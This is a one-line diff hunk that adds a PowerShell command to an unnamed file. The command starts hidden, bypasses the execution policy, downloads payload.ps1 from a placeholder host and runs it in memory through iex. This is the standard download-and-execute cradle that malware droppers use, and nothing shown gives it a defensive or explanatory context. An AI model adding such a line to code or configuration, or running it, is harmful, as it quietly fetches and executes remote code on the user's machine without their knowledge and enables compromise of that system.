@@ -1,0 +1,1 @@
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
